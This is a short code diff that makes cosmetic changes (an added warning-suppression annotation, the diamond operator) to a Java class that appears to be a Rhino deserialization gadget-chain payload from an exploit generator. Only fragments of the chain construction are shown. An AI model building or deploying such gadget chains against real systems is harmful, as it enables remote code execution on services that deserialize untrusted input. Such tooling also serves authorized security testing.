@@ -44,6 +44,7 @@ import java.util.Map;
  * <p>
  * by @_tint0
  */
+@SuppressWarnings({"unchecked","unused"})
 @Dependencies({"rhino:js:1.7R2"})
 @Authors({Authors.TINT0})
 public class MozillaRhino2 implements ObjectPayload<Object> {
@@ -56,7 +57,7 @@ public class MozillaRhino2 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         ScriptableObject dummyScope = new Environment();
-        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
+        Map<Object, Object> associatedValues = new Hashtable<>();
         associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
         Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
 
